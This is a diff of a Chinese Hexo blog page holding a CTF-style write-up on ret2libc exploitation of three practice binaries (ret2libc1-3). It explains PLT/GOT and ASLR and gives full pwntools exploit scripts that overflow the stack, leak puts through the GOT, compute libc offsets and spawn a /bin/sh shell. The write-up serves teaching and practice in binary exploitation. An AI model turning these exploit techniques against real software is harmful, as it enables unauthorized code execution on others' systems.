@@ -20,12 +20,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="1.ret2libc1 先讲几个知识点：  system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。 PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。 GOT(Global Offset Table)表中的数据才是函数最终的地址，plt表中的数据是got表的地址">
+    <meta name="description" content="1.ret2libc1 先讲几个知识点：  system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。 PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。 GOT(Global Offset Table)表中的数据才是函数最终的地址，plt表中的数据是got表的地址，可以通过">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PWN_Ret2libc">
 <meta property="og:url" content="http://example.com/2021/01/28/pwn_ret2libc/index.html">
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
-<meta property="og:description" content="1.ret2libc1 先讲几个知识点：  system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。 PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。 GOT(Global Offset Table)表中的数据才是函数最终的地址，plt表中的数据是got表的地址">
+<meta property="og:description" content="1.ret2libc1 先讲几个知识点：  system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。 PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。 GOT(Global Offset Table)表中的数据才是函数最终的地址，plt表中的数据是got表的地址，可以通过">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2021/01/28/pwn_ret2libc/1612006722313.png">
 <meta property="og:image" content="http://example.com/2021/01/28/pwn_ret2libc/1612006725796.png">
@@ -354,7 +354,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">962</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">968</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -510,42 +510,47 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="ret2libc1">1.ret2libc1</h1>
-<p><strong>先讲几个知识点：</strong></p>
-<ol type="1">
+        <h1 id="1-ret2libc1"><a href="#1-ret2libc1" class="headerlink" title="1.ret2libc1"></a>1.ret2libc1</h1><p> <strong>先讲几个知识点：</strong></p>
+<ol>
 <li>system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。</li>
 <li>PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。</li>
 <li>GOT(Global Offset Table)表中的数据才是函数最终的地址，plt表中的数据是got表的地址，可以通过plt表跳转到got表来得到函数的真正地址。</li>
 <li>地址随机化没有对PLT表和GOT表起作用。</li>
 </ol>
-<p>首先file和checksec一下 <img src="/2021/01/28/pwn_ret2libc/1612006722313.png"> ida查看，没有后门函数，nx打开，且是动态链接程序 <img src="/2021/01/28/pwn_ret2libc/1612006725796.png"> 虽然说没有后门函数，但是调用了system函数： <img src="/2021/01/28/pwn_ret2libc/1612006729066.png"> 并且有/bin/sh字符串： <img src="/2021/01/28/pwn_ret2libc/1612006733238.png"> gdb调试，ebp:0xffffd128 <img src="/2021/01/28/pwn_ret2libc/1612006737011.png"> 所以exp可以这样：</p>
+<p>首先file和checksec一下<br><img src="/2021/01/28/pwn_ret2libc/1612006722313.png"><br>ida查看，没有后门函数，nx打开，且是动态链接程序<br><img src="/2021/01/28/pwn_ret2libc/1612006725796.png"><br>虽然说没有后门函数，但是调用了system函数：<br><img src="/2021/01/28/pwn_ret2libc/1612006729066.png"><br>并且有&#x2F;bin&#x2F;sh字符串：<br><img src="/2021/01/28/pwn_ret2libc/1612006733238.png"><br>gdb调试，ebp:0xffffd128<br><img src="/2021/01/28/pwn_ret2libc/1612006737011.png"><br>所以exp可以这样：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(system_plt)+<span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/01/28/pwn_ret2libc/1612006746037.png"></p>
-<h1 id="ret2libc2">2.ret2libc2</h1>
-<p>这题与ret2libc1差不多，只是没有/bin/sh 字符串，所以需要我们自己写入</p>
+<h1 id="2-ret2libc2"><a href="#2-ret2libc2" class="headerlink" title="2.ret2libc2"></a>2.ret2libc2</h1><p>这题与ret2libc1差不多，只是没有&#x2F;bin&#x2F;sh 字符串，所以需要我们自己写入</p>
 <p>Exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">buf2 = elf.symbols[<span class="string">&quot;buf2&quot;</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(system_plt) +p32(buf2) +p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/01/28/pwn_ret2libc/1612006789960.png"> 当然，exp也可以这样写：</p>
+
+<p><img src="/2021/01/28/pwn_ret2libc/1612006789960.png"><br>当然，exp也可以这样写：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">buf2 = elf.symbols[<span class="string">&quot;buf2&quot;</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_ret = <span class="number">0x0804843d</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(pop_ret) +p32(buf2)+ p32(system_plt)+  p32(<span class="number">0xdeadbeef</span>)+p32(buf2) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="ret2libc3">3.ret2libc3</h1>
-<p>首先查看保护： <img src="/2021/01/28/pwn_ret2libc/1612006820930.png"> <img src="/2021/01/28/pwn_ret2libc/1612006825043.png"> 没有找到system函数和/bin/sh字符串。</p>
+
+
+<h1 id="3-ret2libc3"><a href="#3-ret2libc3" class="headerlink" title="3.ret2libc3"></a>3.ret2libc3</h1><p>首先查看保护：<br><img src="/2021/01/28/pwn_ret2libc/1612006820930.png"><br><img src="/2021/01/28/pwn_ret2libc/1612006825043.png"><br>没有找到system函数和&#x2F;bin&#x2F;sh字符串。</p>
 <p>如果知道libc中某个函数的地址，进而可以知道system函数的地址。</p>
 <p>为得到libc中某个函数的地址，一般采用got表泄露，即输出某个函数对用的got表的内容。由于libc的延迟绑定机制，需要泄露已经执行过的函数的地址。这个机制大致就是在第一次调用某个函数的时候，这个函数的got表中存放的是下一条plt表的指令的地址，经过一系列操作后得到真实地址，然后将这个真实地址放到got表中，这样之后调用这个函数的时候在got表中可以直接找到真实地址。</p>
 <p>因为在这之前已经运行过puts函数，so，got表中放着puts的真实地址，所以我们可以将puts的真实地址打印出来。</p>
 <blockquote>
-<p>libc基地址 + 函数偏移量 = 函数真实地址</p>
+<p>libc基地址   +   函数偏移量    &#x3D;   函数真实地址</p>
 </blockquote>
 <p>以下可以找到puts的真实地址：0xf7da9ca0</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./ret2libc3&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc3&quot;)</span><br><span class="line">puts_got = elf.got[&quot;puts&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(puts_plt) +p32(0xdeadbeef) + p32(puts_got)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = hex(u32(io.recv()[0:4]))</span><br><span class="line">print(puts_addr)</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/01/28/pwn_ret2libc/1612006831449.png"> 找到了puts的真实地址，但是还需要知道libc的版本，其实根据真实地址是可以得到libc的版本的。</p>
+
+
+<p><img src="/2021/01/28/pwn_ret2libc/1612006831449.png"><br>找到了puts的真实地址，但是还需要知道libc的版本，其实根据真实地址是可以得到libc的版本的。</p>
 <p>ASLR，地址随机化，但即是再随机化，它的低12位保持不变，因为内存页对齐的缘故。</p>
-<p>0xf7da9ca0的低12位是ca0，这里有个网站：https://libc.blukat.me/</p>
-<p>可以根据低12位查到这个的版本 <img src="/2021/01/28/pwn_ret2libc/1612006838772.png"> 这样就得到了system函数的偏移和/bin/sh的偏移。</p>
+<p>0xf7da9ca0的低12位是ca0，这里有个网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
+<p>可以根据低12位查到这个的版本<br><img src="/2021/01/28/pwn_ret2libc/1612006838772.png"><br>这样就得到了system函数的偏移和&#x2F;bin&#x2F;sh的偏移。</p>
 <blockquote>
-<p>system_offset = 0x03d2e0 puts_offset = 0x067ca0 bin_sh_offset = 0x17e0af</p>
+<p>system_offset &#x3D; 0x03d2e0<br>puts_offset &#x3D; 0x067ca0<br>bin_sh_offset &#x3D; 0x17e0af</p>
 </blockquote>
 <p>完整EXP：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(puts_plt_addr) + p32(main_plt_addr) + p32(puts_got_addr)</span><br><span class="line">#main_plt_addr可以使程序再次溢出</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line"></span><br><span class="line">sys_offset = 0x03d2e0</span><br><span class="line">puts_offset = 0x067ca0</span><br><span class="line">sh_offset = 0x17e0af</span><br><span class="line">#libc基地址 + 函数偏移 = 函数真实地址</span><br><span class="line">libc_base_addr = puts_addr - puts_offset</span><br><span class="line">sys_addr = libc_base_addr + sys_offset </span><br><span class="line">sh_addr = libc_base_addr + sh_offset </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*112 +p32(sys_addr) + p32(0xdeadbeef) +p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
 
     </article>
     <!-- license -->
@@ -695,7 +700,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libc1"><span class="toc-number">1.</span> <span class="toc-text">1.ret2libc1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libc2"><span class="toc-number">2.</span> <span class="toc-text">2.ret2libc2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libc3"><span class="toc-number">3.</span> <span class="toc-text">3.ret2libc3</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-ret2libc1"><span class="toc-number">1.</span> <span class="toc-text">1.ret2libc1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-ret2libc2"><span class="toc-number">2.</span> <span class="toc-text">2.ret2libc2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-ret2libc3"><span class="toc-number">3.</span> <span class="toc-text">3.ret2libc3</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1629,6 +1634,11 @@
                 PWN
             </span>
         
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="RE">
                 <span class="iconfont-archer">&#xe606;</span>
                 RE
@@ -1639,24 +1649,19 @@
                 BUU刷题
             </span>
         
-            <span class="sidebar-tag-name" data-tags="WEB">
-                <span class="iconfont-archer">&#xe606;</span>
-                WEB
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="Java">
                 <span class="iconfont-archer">&#xe606;</span>
                 Java
             </span>
         
-            <span class="sidebar-tag-name" data-tags="内网">
-                <span class="iconfont-archer">&#xe606;</span>
-                内网
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="免杀">
                 <span class="iconfont-archer">&#xe606;</span>
                 免杀
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="内网">
+                <span class="iconfont-archer">&#xe606;</span>
+                内网
             </span>
         
             <span class="sidebar-tag-name" data-tags="VulnHub">
@@ -1689,14 +1694,14 @@
                 Linux
             </span>
         
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="OS">
+                <span class="iconfont-archer">&#xe606;</span>
+                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="WriteUp">
